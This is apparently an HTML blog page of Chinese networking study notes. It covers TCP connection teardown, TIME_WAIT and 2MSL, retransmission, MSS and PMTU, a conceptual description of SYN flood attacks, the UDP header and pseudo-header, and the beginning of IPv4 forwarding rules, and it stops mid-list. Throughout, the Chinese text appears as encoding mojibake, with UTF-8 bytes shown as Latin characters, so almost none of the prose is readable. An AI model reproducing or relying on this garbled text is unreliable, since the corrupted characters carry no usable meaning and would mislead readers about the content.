<p>è‡³æ­¤ï¼ŒTCPå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„è¿æ¥è¢«å»ºç«‹èµ·æ¥ï¼Œå¯ä»¥è¿›è¡Œç›¸äº’é—´çš„æ•°æ®ä¼ è¾“äº†</p>
<p><img src="/archives/eecf3b2/111.png"></p>
<ol>
<li>æŸä¸ªåº”ç”¨è¿›ç¨‹é¦–å…ˆè°ƒç”¨close,ç§°è¯¥ç«¯æ‰§è¡Œâ€œä¸»åŠ¨å…³é—­â€ï¼Œè¯¥ç«¯çš„TCPäºæ˜¯å‘é€ä¸€ä¸ªFINåˆ†èŠ‚ï¼Œè¡¨ç¤ºæ•°æ®å‘é€å®Œæ¯•,æ­¤æ—¶ä¸»åŠ¨æ–¹å°†å…³é—­å‘é€æœåŠ¡ã€‚</li>
<li>æ¥å—åˆ°è¿™ä¸ªFINçš„å¯¹ç«¯æ‰§è¡Œâ€œè¢«åŠ¨å…³é—­â€ï¼Œè¿™ä¸ªFINç”±TCPç¡®è®¤ï¼Œå‘é€ACKåŒ…ç»™ä¸»åŠ¨æ–¹ã€‚FINçš„æ¥æ”¶ä¹Ÿä½œä¸ºä¸€ä¸ªæ–‡ä»¶ç»“æŸç¬¦ï¼ˆend-of-fileï¼‰ä¼ é€’ç»™æ¥æ”¶ç«¯åº”ç”¨è¿›ç¨‹ï¼Œæ”¾åœ¨å·²æ’é˜Ÿç­‰å€™è¯¥åº”ç”¨è¿›ç¨‹æ¥æ”¶çš„ä»»ä½•å…¶ä»–æ•°æ®ä¹‹åï¼Œå› ä¸ºï¼ŒFINçš„æ¥æ”¶æ„å‘³ç€æ¥æ”¶ç«¯åº”ç”¨è¿›ç¨‹åœ¨ç›¸åº”è¿æ¥ä¸Šå†æ— é¢å¤–æ•°æ®å¯æ¥æ”¶ã€‚</li>
<li>ä¸€æ®µæ—¶é—´åï¼Œæ¥å—åˆ°è¿™ä¸ªæ–‡ä»¶ç»“æŸç¬¦çš„åº”ç”¨è¿›ç¨‹å°†è°ƒç”¨closeå…³é—­å®ƒçš„å¥—æ¥å­—ã€‚è¿™å¯¼è‡´ä»–çš„tcpä¹Ÿå‘é€ä¸€ä¸ªFIN+ACKï¼Œè¿›å…¥LAST-ACKçŠ¶æ€ã€‚</li>
<li>æ¥å—ç«¯æ¥å—åˆ°è¿™ä¸ªFINåï¼Œå…¶TCPç¡®è®¤è¿™ä¸ªFINå‘è¢«åŠ¨æ–¹å‘é€ACKåŒ…ã€‚ä»è€Œè¿›å…¥TIME_WAITçŠ¶æ€ã€‚ç­‰å¾…2MSLä¹‹åï¼Œå¦‚ä¸å†æœ‰æ–°çš„ACK+FINåŒ…ä¼ æ¥ï¼Œåˆ™ä¸»åŠ¨æ–¹å…³é—­æ¥æ”¶æœåŠ¡ï¼ˆè¢«åŠ¨æ–¹è‹¥è¶…è¿‡mslä¹‹åä»æ²¡æœ‰æ”¶åˆ°ç¡®è®¤åŒ…ï¼Œåˆ™ä¼šé‡å‘FIN_ACKåŒ…ï¼Œä¸»åŠ¨æ–¹åœ¨2mslä¹‹åå†å…³é—­æœåŠ¡åˆ™èƒ½ç¡®ä¿èƒ½å¤Ÿæ”¶åˆ°æ¥è‡ªè¢«åŠ¨æ–¹çš„é‡å‘åŒ…ï¼‰ã€‚</li>
</ol>
<p><img src="/archives/eecf3b2/100327022731.jpg"></p>
<h2 id="å¯é æ€§å®ç°"><a href="#å¯é æ€§å®ç°" class="headerlink" title="å¯é æ€§å®ç°"></a>å¯é æ€§å®ç°</h2><h3 id="é‡ä¼ ç­–ç•¥"><a href="#é‡ä¼ ç­–ç•¥" class="headerlink" title="é‡ä¼ ç­–ç•¥"></a>é‡ä¼ ç­–ç•¥</h3><p>TCPåœ¨å‘é€ä¸€ä¸ªæ•°æ®æ®µåç«‹å³å¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨ï¼Œå¦‚æœåœ¨é‡ä¼ è¶…æ—¶æ—¶é—´å†…æ¥æ”¶åˆ°ç¡®è®¤å°±å…³é—­è¯¥é‡ä¼ ï¼Œå¦‚æœæœªæ¥æ”¶åˆ°ç¡®è®¤ï¼Œåˆ™é‡ä¼ è¯¥æ•°æ®æ®µã€‚</p>
<h3 id="å¯é æ€§"><a href="#å¯é æ€§" class="headerlink" title="å¯é æ€§"></a>å¯é æ€§</h3><ol>
<li>æ ¡éªŒå’Œï¼šTCPå°†ä¿æŒä»–é¦–éƒ¨å’Œæ•°æ®çš„æ ¡éªŒå’Œã€‚è¿™æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„æ ¡éªŒå’Œï¼Œç›®çš„æ˜¯æ£€æµ‹æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„ä»»ä½•å˜åŒ–ã€‚å¦‚æœæ”¶åˆ°æ®µçš„æ ¡éªŒå’Œæœ‰å·®åˆ«ï¼ŒTCPå°†ä¸¢å¼ƒè¿™ä¸ªæŠ¥æ–‡æ®µå¹¶ä¸”ä¸ç¡®è®¤è¿™æ®µæŠ¥æ–‡ã€‚</li>
<li>æ•°æ®åŒ…é¡ºåºï¼šé€šè¿‡IPæ•°æ®æŠ¥çš„æ–¹å¼ä¼ é€ï¼Œå› ä¸ºè·¯ç”±é€‰æ‹©çš„ä¸åŒå¯èƒ½åœ¨æˆæ•°æ®åŒ…çš„å¤±åºã€‚æŠ¥æ–‡å¤´ä¸­çš„Sequence Numberå°±æ˜¯æ¥å—ç«¯é‡æ–°è¿›è¡ŒåŒ…æ’åºçš„ä¾æ®ï¼Œä¹Ÿæ˜¯åˆ é™¤é‡å¤åŒ…çš„ä¾æ®</li>
<li>æµé‡æ§åˆ¶ï¼šTCPæ¥å—ç«¯éƒ½æœ‰å›ºå®šå¤§å°çš„ç¼“å†²ç©ºé—´ï¼ŒåŒæ–¹é€šè¿‡SYNä¸­çš„MSSåå•†å‘é€ã€æ¥å—æ•°æ®çš„å¤§å°ï¼Œä»è€Œé˜²æ­¢ç¼“å†²åŒºçš„æº¢å‡ºã€‚</li>
</ol>
<h3 id="çª—å£ç¡®è®¤"><a href="#çª—å£ç¡®è®¤" class="headerlink" title="çª—å£ç¡®è®¤"></a>çª—å£ç¡®è®¤</h3><p>ä½¿ç”¨æ•°æ®æŠ¥å¤´åºåˆ—å·åŠç¡®è®¤å·æ¥ç¡®è®¤å·²æ”¶åˆ°åŒ…å«åœ¨æ•°æ®æ®µçš„ç›¸å…³çš„æ•°æ®å­—èŠ‚ã€‚</p>
<p>æºä¸»æœºåœ¨æ”¶åˆ°ç¡®è®¤æ¶ˆæ¯ä¹‹å‰å¯ä»¥ä¼ è¾“çš„æ•°æ®çš„å¤§å°ç§°ä¸ºçª—å£å¤§å°</p>
<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="MSSåå•†"><a href="#MSSåå•†" class="headerlink" title="MSSåå•†"></a>MSSåå•†</h3><p>åœ¨TCPå»ºç«‹è¿æ¥çš„ä¸‰æ¬¡æ¡æ‰‹ä¸­ï¼Œæœ‰ä¸€ç§å¾ˆé‡è¦çš„å·¥ä½œé‚£å°±æ˜¯è¿›è¡ŒMSSåå•†ã€‚è¿æ¥çš„åŒæ–¹éƒ½åœ¨SYNæŠ¥æ–‡ä¸­å¢åŠ MSSé€‰é¡¹ï¼Œå…¶é€‰é¡¹å€¼è¡¨ç¤ºæœ¬ç«¯æœ€å¤§èƒ½æ¥æ”¶çš„æ®µå¤§å°ï¼Œå³å¯¹ç«¯æœ€å¤§èƒ½å‘é€çš„æ®µå¤§å°ã€‚è¿æ¥çš„åŒæ–¹å–æœ¬ç«¯å‘é€çš„MSSå€¼å’Œæ¥æ”¶å¯¹ç«¯çš„MSSå€¼çš„è¾ƒå°è€…ä½œä¸ºæœ¬è¿æ¥æœ€å¤§ä¼ è¾“æ®µå¤§å°ã€‚</p>
<p>å‘é€SYNæŠ¥æ–‡æ—¶çš„MSSé€‰é¡¹å€¼çš„è®¡ç®—æ–¹æ³•å¦‚ä¸‹ã€‚</p>
<p>léç›´è¿ç½‘ç»œä¸­ï¼šmss &#x3D; é»˜è®¤å€¼536ã€‚</p>
<p>lç›´è¿ç½‘ç»œä¸­ï¼šmss &#x3D; å¯¹ç«¯ipåœ°å€å¯¹åº”çš„å‡ºå£çš„MTU - 20å­—èŠ‚ipå¤´ - 20å­—èŠ‚tcpå¤´ã€‚</p>
<p>è‹¥è¿æ¥è¿‡ç¨‹ä¸­å‘é€ç«¯æˆ–è€…æ¥å—ç«¯åå•†çš„MSSè¶…è¿‡è·¯ç”±å™¨å…è®¸çš„æœ€å¤§å€¼ï¼Œè·¯ç”±å™¨åˆ™ä¼šæ‹’ç»è½¬å‘ã€‚æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Œåœ¨tcpè¿æ¥çš„å»ºç«‹è¿‡ç¨‹ä¸­è¿›è¡Œsynåå•†æ—¶ï¼Œè·¯ç”±å™¨ä¼šè¿›è¡Œè§£åŒ…ï¼Œå¦‚æœå‘ç°mssè¶…è¿‡é™åˆ¶ï¼Œåˆ™ä¼šå¯¹è¯¥å€¼è¿›è¡Œä¿®æ”¹ï¼Œå†é‡æ–°å°è£…å‘é€ã€‚</p>
<h3 id="PMTUå‘ç°"><a href="#PMTUå‘ç°" class="headerlink" title="PMTUå‘ç°"></a>PMTUå‘ç°</h3><p>PMTU:è·¯å¾„æœ€å¤§ä¼ è¾“å•å…ƒã€‚</p>
<p>å½“è®¾å¤‡å‘ç°å½“å‰çš„PMUTæ¯”åŒæ–¹åå•†çš„msså°æ—¶ï¼Œåˆ™è®¾å¤‡å°±ä¼šæŒ‰ä¸€å®šçš„æ—¶é—´é—´éš”å»å°è¯•å‘ç°æ›´å¤§çš„PMTU,æŒ‡å¯¼PMTUè¾¾åˆ°æœ€å¤§å€¼ã€‚</p>
<h3 id="SYNæ”»å‡»"><a href="#SYNæ”»å‡»" class="headerlink" title="SYNæ”»å‡»"></a>SYNæ”»å‡»</h3><p>åœ¨ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡æ–¹åœ¨æ¥å—äº†è¯·æ±‚æ–¹çš„SYNåå‘é€SYN+ACKå›æŠ¥ï¼ŒåŒæ—¶è¿›å…¥SYN_RECVçŠ¶æ€ï¼Œè‹¥åœ¨è®¾ç½®çš„æ—¶é—´é˜ˆå€¼ä¹‹åä»ç„¶æ²¡æœ‰æ”¶åˆ°è¯·æ±‚æ–¹çš„ACKåŒ…ï¼Œåˆ™æœåŠ¡æ–¹å°†é‡å‘SYN+ACKåŒ…ï¼ŒçŸ¥é“è¾¾åˆ°è®¾å®šçš„é‡å‘æ¬¡æ•°ä¸ºæ­¢ã€‚SYNæ”»å‡»åˆ™æ˜¯åˆ©ç”¨è¿™ä¸€è¿‡ç¨‹ï¼Œä½¿ç”¨å¤§é‡çš„è™šå‡IPä¸æ–­çš„å‘èµ·SYNè¯·æ±‚å´ä¸å‘é€ACKå›åŒ…ï¼Œè¿™æ ·è¿™äº›ä¼ªé€ çš„SYNåŒ…å°†å ç”¨æœªè¿æ¥é˜Ÿåˆ—ï¼Œä½¿æ­£å¸¸çš„SYNè¯·æ±‚è¢«ä¸¢å¼ƒï¼Œå¯¼è‡´ç›®æ ‡ç³»ç»Ÿè¿è¡Œç¼“æ…¢ï¼Œç”šè‡³å¯¼è‡´ç½‘ç»œå µå¡æˆ–ç³»ç»Ÿç˜«ç—ªã€‚</p>
<h3 id="ä¸»åŠ¨æ–¹æœ€åå‘é€ACKåŒ…åä¸ºä»€ä¹ˆéœ€è¦è¿›å…¥TIME-WAITçŠ¶æ€ï¼ŸTIME-WAITçŠ¶æ€çš„æŒç»­æ—¶é—´ä¸ºä»€ä¹ˆæ˜¯2MSL"><a href="#ä¸»åŠ¨æ–¹æœ€åå‘é€ACKåŒ…åä¸ºä»€ä¹ˆéœ€è¦è¿›å…¥TIME-WAITçŠ¶æ€ï¼ŸTIME-WAITçŠ¶æ€çš„æŒç»­æ—¶é—´ä¸ºä»€ä¹ˆæ˜¯2MSL" class="headerlink" title="ä¸»åŠ¨æ–¹æœ€åå‘é€ACKåŒ…åä¸ºä»€ä¹ˆéœ€è¦è¿›å…¥TIME_WAITçŠ¶æ€ï¼ŸTIME_WAITçŠ¶æ€çš„æŒç»­æ—¶é—´ä¸ºä»€ä¹ˆæ˜¯2MSL"></a>ä¸»åŠ¨æ–¹æœ€åå‘é€ACKåŒ…åä¸ºä»€ä¹ˆéœ€è¦è¿›å…¥TIME_WAITçŠ¶æ€ï¼ŸTIME_WAITçŠ¶æ€çš„æŒç»­æ—¶é—´ä¸ºä»€ä¹ˆæ˜¯2MSL</h3><p>å½“ä¸»åŠ¨æ–¹å‘é€äº†æœ€åçš„ACKåŒ…åï¼Œå¹¶ä¸èƒ½å®Œå…¨ç¡®ä¿è¢«åŠ¨æ–¹æ¥æ”¶åˆ°äº†è¯¥åŒ…ã€‚å¦‚æœè¯¥åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸¢å¤±ï¼Œé‚£ä¹ˆè¢«åŠ¨æ–¹åœ¨ç­‰å¾…äº†è®¾å®šçš„è¶…æ—¶å“åº”æ—¶é—´ä¹‹ååˆ™ä¼šé‡ä¼ FINåŒ…ï¼Œæ­¤æ—¶ä¸»åŠ¨æ–¹æ˜¯å¤„äºTIME_WAITçŠ¶æ€çš„ï¼Œåœ¨2mslæ—¶é—´å†…åˆ™æ˜¯ä¸ºäº†ç¡®ä¿ä¸»åŠ¨æ–¹èƒ½å¤Ÿæ¥æ”¶åˆ°è¢«åŠ¨æ–¹é‡å‘çš„FINåŒ…ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿TCPå…¨åŒå·¥è¿æ¥çš„å¯é ç»ˆæ­¢ï¼ŒåŒæ—¶ä¹Ÿèƒ½ç¡®ä¿è€çš„é‡å¤çš„åˆ†èŠ‚åœ¨ç½‘ç»œä¸­æ¶ˆé€ï¼Œä¸»åŠ¨æ–¹åœ¨ç­‰å¾…2MSLä¹‹åå°±å¯ä»¥ä¸Šä½¿æ‰€æœ‰åœ¨è¿æ¥è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æŠ¥æ–‡æ®µåœ¨ç½‘ç»œä¸­æ¶ˆå¤±ï¼Œå› ä¸ºå¤„äºTIME_WAITçŠ¶æ€çš„åˆ†èŠ‚æ˜¯ä¸å…è®¸ç»‘å®šçš„ã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸¤æ¬¡æ¡æ‰‹å¯ä»¥å—"><a href="#ä¸ºä»€ä¹ˆéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸¤æ¬¡æ¡æ‰‹å¯ä»¥å—" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸¤æ¬¡æ¡æ‰‹å¯ä»¥å—"></a>ä¸ºä»€ä¹ˆéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸¤æ¬¡æ¡æ‰‹å¯ä»¥å—</h3><p>ä¸å¯ä»¥ï¼Œä¸¤æ¬¡æ¡æ‰‹å¯èƒ½é€ æˆæ­»é”ã€‚å½“è¯·æ±‚æ–¹å‘é€SYNåï¼ŒæœåŠ¡æ–¹å›ACK+SYNåŒ…ï¼ŒæŒ‰ç…§ä¸¤æ¬¡æ¡æ‰‹çš„æƒ…å†µï¼Œå¦‚æœæœåŠ¡æ–¹çš„ACKåŒ…åœ¨å‘é€è¿‡ç¨‹ä¸­ä¸¢å¤±ï¼ŒæœåŠ¡æ–¹è‡ªå·±å´ä¸çŸ¥æƒ…ï¼Œåœ¨å‘é€äº†ACKåŒ…åï¼Œä»–å°±å¼€å§‹ä¼ é€æ•°æ®ï¼Œè¯·æ±‚æ–¹å› ä¸ºæœªæ”¶åˆ°æ¥è‡ªæœåŠ¡æä¾›æ–¹çš„ACKåŒ…ï¼Œé‚£ä¹ˆå°†ä¸€ç›´å¤„äºSYN_SENDçŠ¶æ€ï¼ŒæœåŠ¡æ–¹å‘è¿‡æ¥çš„æ­£å¸¸æ•°æ®åŒ…å°†è¢«è¯·æ±‚æ–¹ä¸¢å¼ƒï¼Œè€ŒæœåŠ¡æ–¹åˆ™å› ä¸ºè‡ªå·±å‘é€çš„æ•°æ®åŒ…æœªæ”¶åˆ°æ¥è‡ªè¯·æ±‚æ–¹çš„ç¡®è®¤åŒ…ï¼Œåˆ†ç»„è¶…æ—¶åå°†é‡å‘ç›¸åŒçš„åˆ†ç»„ï¼Œä»è€Œé€ æˆæ­»é”ã€‚</p>
<h1 id="UDPåè®®"><a href="#UDPåè®®" class="headerlink" title="UDPåè®®"></a>UDPåè®®</h1><p>æœ¬éƒ¨åˆ†ç¬”è®°å‚è€ƒç½‘å€ï¼š</p>
<p><a href="https://baike.baidu.com/item/UDP">UDP_ç™¾åº¦ç™¾ç§‘</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/101552588">ä¸ä¸ºäººçŸ¥çš„UDPï¼šæ·±å…¥åœ°ç†è§£UDPåè®®å¹¶ç”¨å¥½å®ƒ</a></p>
<h2 id="åŸºæœ¬æƒ…å†µ"><a href="#åŸºæœ¬æƒ…å†µ" class="headerlink" title="åŸºæœ¬æƒ…å†µ"></a>åŸºæœ¬æƒ…å†µ</h2><p>UDP:ç”¨æˆ·æ•°æ®åŒ…åè®®ã€‚æ˜¯ä¸€ç§é¢å‘äº‹åŠ¡çš„ï¼Œè¿æ¥ä¸å¯é çš„ä¼ è¾“å±‚åè®®ã€‚ä¸èƒ½æä¾›æ•°æ®çš„åˆ†ç»„ã€ç»„è£…ã€æ’åºï¼Œå› ä¸ºé¦–éƒ¨ç®€çŸ­ï¼Œæ‰€é¢å¤–å¼€é”€æ®è¾ƒå°‘ï¼Œæµé‡çš„å¼€é”€è¾ƒå°‘ï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„å»¶è¿Ÿå°ï¼Œæ•°æ®çš„ä¼ è¾“æ•ˆç‡é«˜ï¼Œé€‚åˆå¯¹å¯é æ€§è¦æ±‚ä¸é«˜çš„ç¨‹åºã€‚ç‰¹åˆ«é€‚ç”¨äºå‘é€é‚£äº›ç®€çŸ­çš„æ•°æ®ï¼ŒåŒæ—¶UDPåè®®æ˜¯ä¸€ç§ä¸€å¯¹å¤šçš„åè®®ï¼Œæ‰€ä»¥åœ¨ç›´æ’­é¢†åŸŸã€è§†é¢‘ä¼šè®®é¢†åŸŸï¼Œå¤šåª’ä½“æ•°æ®çš„ä¼ è¾“ç­‰æ–¹é¢å¤šä½¿ç”¨ã€‚å…¶å¯é æ€§ä¸åˆ†ç»„éƒ½æœ‰åº”ç”¨å±‚å®Œæˆï¼Œå¦‚DNSã€TFTPã€SNMPç­‰åè®®</p>
<h2 id="UDPæŠ¥å¤´"><a href="#UDPæŠ¥å¤´" class="headerlink" title="UDPæŠ¥å¤´"></a>UDPæŠ¥å¤´</h2><p>æ€»å…±8ä¸ªå­—èŠ‚ï¼Œåˆ†ä¸º4ä¸ªåŸŸï¼Œæ¯ä¸ªåŸŸ2ä¸ªå­—èŠ‚ã€‚</p>
<p>Source Port â€”â€”â€”æºç«¯å£ï¼Œ16bits,0-65535</p>
<p>Destination Portâ€”â€”â€”ç›®çš„ç«¯å£,16bits,0-65535</p>
<p>æ•°æ®é•¿åº¦â€”â€”â€”16bits,UDPæŠ¥æ–‡æ®µçš„é•¿åº¦ï¼Œæœ€çŸ­ä¸º8ï¼ˆä»…é¦–éƒ¨ï¼‰</p>
<p>Checksumâ€”â€”â€”16bitsï¼Œæ•´ä¸ªæ•°æ®æ®µçš„æ ¡éªŒå’Œï¼Œæ¥å—ç«¯æ¥å—åˆ°è¯¥æŠ¥æ–‡æ®µåï¼Œè®¡ç®—æ ¡éªŒå’Œï¼Œè‹¥è®¡ç®—å‡ºçš„æ ¡éªŒå’Œä¸è¯¥å€¼ç›¸ç­‰åˆ™ä¿ç•™è¯¥æ•°æ®æ®µï¼Œè‹¥ä¸ç›¸ç­‰åˆ™ä¸¢å¼ƒè¯¥æ•°æ®æ®µã€‚è¯¥å€¼ä¸æ˜¯å¿…é¡»çš„ã€‚</p>
<h3 id="UDPä¼ªæŠ¥å¤´"><a href="#UDPä¼ªæŠ¥å¤´" class="headerlink" title="UDPä¼ªæŠ¥å¤´"></a>UDPä¼ªæŠ¥å¤´</h3><p>Source IPâ€”â€”æºIPåœ°å€ï¼Œ32bits</p>
<p>Destination Ip â€”â€”â€”ç›®çš„IPåœ°å€ï¼Œ32bits</p>
<p>å¡«å……ä½â€”â€”â€”8bits,å‡å¡«å……ä¸º0</p>
<p>Protocolâ€”â€”â€”åè®®ä½ï¼Œä½¿ç”¨åè®®çš„åè®®å·ï¼Œ8bitsï¼ŒUDPä¸º17</p>
<p>Data Segment Length â€”â€”â€”æ•°æ®æ®µé•¿åº¦ï¼Œ16bits</p>
<p>é¦–éƒ¨å¹¶éTCP&amp;UDPæ•°æ®æŠ¥ä¸­å®é™…çš„æœ‰æ•ˆæˆåˆ†ã€‚ä¼ªé¦–éƒ¨æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ æ•°æ®ç»“æ„ï¼Œå…¶ä¸­çš„ä¿¡æ¯æ˜¯ä»æ•°æ®æŠ¥æ‰€åœ¨IPåˆ†ç»„å¤´çš„åˆ†ç»„å¤´ä¸­æå–çš„ï¼Œæ—¢ä¸å‘ä¸‹ä¼ é€ä¹Ÿä¸å‘ä¸Šé€’äº¤ï¼Œè€Œä»…ä»…æ˜¯ä¸ºè®¡ç®— æ ¡éªŒå’Œã€‚è¿™æ ·çš„ æ ¡éªŒå’Œï¼Œæ—¢æ ¡éªŒäº†TCP&amp;UDPç”¨æˆ·æ•°æ®çš„æº ç«¯å£å·å’Œç›®çš„ç«¯å£å·ä»¥åŠTCP&amp;UDPç”¨æˆ·æ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†ï¼Œåˆæ£€éªŒäº†IPæ•°æ®æŠ¥çš„æºIPåœ°å€å’Œç›®çš„åœ°å€ã€‚ä¼ªæŠ¥å¤´ä¿è¯TCP&amp;UDPæ•°æ®å•å…ƒåˆ°è¾¾æ­£ç¡®çš„ç›®çš„åœ°å€ã€‚å› æ­¤ï¼Œä¼ªæŠ¥å¤´ä¸­åŒ…å«IPåœ°å€å¹¶ä¸”ä½œä¸ºè®¡ç®— æ ¡éªŒå’Œéœ€è¦è€ƒè™‘çš„ä¸€éƒ¨åˆ†ã€‚æœ€ç»ˆç›®çš„ç«¯æ ¹æ®ä¼ªæŠ¥å¤´å’Œ æ•°æ®å•å…ƒè®¡ç®— æ ¡éªŒå’Œä»¥éªŒè¯é€šä¿¡æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¡æœ‰æ”¹å˜è€Œä¸”åˆ°è¾¾äº†æ­£ç¡®çš„ç›®çš„åœ°å€ã€‚</p>
<h2 id="å…¶ä»–-1"><a href="#å…¶ä»–-1" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="UDPæŠ¥æ–‡æ®µæ•°æ®éƒ¨åˆ†é•¿åº¦"><a href="#UDPæŠ¥æ–‡æ®µæ•°æ®éƒ¨åˆ†é•¿åº¦" class="headerlink" title="UDPæŠ¥æ–‡æ®µæ•°æ®éƒ¨åˆ†é•¿åº¦"></a>UDPæŠ¥æ–‡æ®µæ•°æ®éƒ¨åˆ†é•¿åº¦</h3><ul>
<li><p>UDPæ•°æ®åŒ…æ•°æ®æ®µçš„ç†è®ºæœ€å¤§é•¿åº¦ï¼š</p>
<ol>
<li>udpåè®®æœ¬èº«è§„å®šäº†å…¶æœ‰16ä½çš„æŠ¥æ–‡é•¿åº¦ï¼Œåˆ™å…¶æŠ¥æ–‡é•¿åº¦ä¸èƒ½è¶…è¿‡2^16&#x3D;65536ã€‚</li>
<li>æŠ¥å¤´å 8å­—èŠ‚</li>
<li>IPæŠ¥å¤´å 20å­—èŠ‚</li>
</ol>
<p>  åˆ™å…¶ç†è®ºé•¿åº¦ä¸ºï¼š65536-1-8-20&#x3D;65507å­—èŠ‚ã€‚
  </p>
</li>
<li><p>å®é™…æœ€å¤§é•¿åº¦ï¼š</p>
<ol>
<li>UDPå‘é€ç¼“å­˜åŒºå¤§å°é™åˆ¶</li>
<li>ä»¥å¤ªç½‘å‘é€æ•°æ®å¸§çš„é•¿åº¦é™åˆ¶</li>
<li>æ•°æ®é“¾è·¯å±‚MTUé™åˆ¶</li>
</ol>
</li>
<li><p>ç†æƒ³é•¿åº¦ï¼š</p>
<p>  å—ä»¥å¤ªç½‘ä¼ è¾“ç”µæ°”æ–¹é¢çš„é™åˆ¶ï¼Œæ¯ä¸ªä»¥å¤ªç½‘å¸§æœ€å°å­—èŠ‚ä¸º64ï¼Œæœ€å¤§ä¸º1518å­—èŠ‚ï¼Œè¶…è¿‡è¿™ä¸ªèŒƒå›´çš„å¸§å‡è¢«è§†ä¸ºé”™è¯¯çœŸä¸¢å¼ƒï¼Œåœ¨å‡æ‰ä»¥å¤ªç½‘å¸§çš„å¸§å¤´éƒ¨åˆ†ï¼ˆDMACç›®çš„ MAC åœ°å€48bit&#x3D;6Bytes+SMACæº MAC åœ°å€48bit&#x3D;6Bytes+TypeåŸŸï¼ˆä¸Šå±‚åè®®ç±»å‹ï¼Œç”¨ä»¥æ¥æ”¶ç«¯åˆ¤æ–­å°†æ•°æ®éƒ¨åˆ†ä¸Šé€åˆ°å“ªä¸€ç§åè®®-icmp,ip,arpï¼‰2bytesï¼‰å…±14å­—èŠ‚ï¼Œå’Œå¸§å°¾éƒ¨åˆ†çš„CRCâ€”-å¾ªç¯å†—ä½™æ ¡éªŒéƒ¨åˆ†ï¼Œèƒ½å¤Ÿæ‰¿è½½ä¸Šå±‚åè®®çš„æ•°æ®åŸŸæœ€å¤§åªèƒ½ä¸º1500å­—èŠ‚ï¼Œå³ä¸ºMTUã€‚é‚£ä¹ˆè¦æƒ³IPå±‚ä¸åˆ†åŒ…ï¼Œé‚£ä¹ˆUDPæ•°æ®åŒ…çš„æœ€å¤§å€¼ä¸º1500-20-8&#x3D;1472å­—èŠ‚ã€‚é‰´äºInternetçš„æ ‡å‡†MTUå€¼ä¸º576å­—èŠ‚ï¼Œæ•…å»ºè®®UDPçš„æ•°æ®é•¿åº¦æ§åˆ¶åœ¨ï¼ˆ576-8-20&#x3D;548å­—èŠ‚ï¼‰ä»¥å†…ã€‚</p>
<p>  é‡‡ç”¨å†—ä½™ä¼ è¾“æ–¹æ¡ˆï¼šå»¶æ—¶åŒå‘-å°†åŸæœ¬å•å‘çš„å‰åè¿ç»­çš„ä¸¤ä¸ªåŒ…åˆå¹¶æˆä¸€ä¸ªå¤§åŒ…å‘é€ã€‚</p>
</li>
</ul>
<h3 id="å¦‚ä½•è·å–å®Œæ•´çš„UDPåŒ…"><a href="#å¦‚ä½•è·å–å®Œæ•´çš„UDPåŒ…" class="headerlink" title="å¦‚ä½•è·å–å®Œæ•´çš„UDPåŒ…"></a>å¦‚ä½•è·å–å®Œæ•´çš„UDPåŒ…</h3><p>é‡‡ç”¨å†—ä½™ä¼ è¾“æ–¹æ¡ˆï¼šå»¶æ—¶åŒå‘-å°†åŸæœ¬å•å‘çš„å‰åè¿ç»­çš„ä¸¤ä¸ªåŒ…åˆå¹¶æˆä¸€ä¸ªå¤§åŒ…å‘é€ã€‚</p>
<p><img src="/archives/eecf3b2/30193705-accbdcad601c4d45b96392feea1bb63a.png"></p>
<h1 id="IPv4åè®®"><a href="#IPv4åè®®" class="headerlink" title="IPv4åè®®"></a>IPv4åè®®</h1><p>æœ¬éƒ¨åˆ†ç¬”è®°å‚è€ƒï¼š</p>
<p><a href="https://www.cnblogs.com/red-code/p/7132023.html">Red_Code</a></p>
<h2 id="åŸºæœ¬ä»‹ç»"><a href="#åŸºæœ¬ä»‹ç»" class="headerlink" title="åŸºæœ¬ä»‹ç»"></a>åŸºæœ¬ä»‹ç»</h2><p>IP:Internet Protocolï¼Œç½‘é™…äº’è¿åè®®ï¼Œå…¶å·¥ä½œåœ¨OSIå‚è€ƒæ¨¡å‹çš„ç½‘ç»œå±‚ä¸Šï¼Œæä¾›ä¸€ç§æ— è¿æ¥çš„ã€ä¸å¯é çš„ã€å°½åŠ›è€Œä¸ºçš„æ•°æ®åŒ…ä¼ è¾“æœåŠ¡ã€‚</p>
<h2 id="ä¸»è¦å†…å®¹"><a href="#ä¸»è¦å†…å®¹" class="headerlink" title="ä¸»è¦å†…å®¹"></a>ä¸»è¦å†…å®¹</h2><h3 id="IPåˆ†ç»„è½¬å‘è§„åˆ™"><a href="#IPåˆ†ç»„è½¬å‘è§„åˆ™" class="headerlink" title="IPåˆ†ç»„è½¬å‘è§„åˆ™"></a>IPåˆ†ç»„è½¬å‘è§„åˆ™</h3><ul>
<li><p>ç›´æ¥äº¤ä»˜ï¼š</p>
<p>  å½“IPæ•°æ®åŒ…ç»ç”±è·¯ç”±å™¨è½¬å‘æ—¶ï¼Œå¦‚æœç›®æ ‡è®¾å¤‡ä¸æœ¬åœ°è·¯ç”±å™¨ç›´æ¥ç›¸è¿ï¼Œåˆ™ç›´æ¥å°†æ•°æ®åŒ…äº¤ä»˜ç»™ç›®æ ‡ä¸»æœº</p>
</li>
<li><p>é—´æ¥äº¤ä»˜</p>
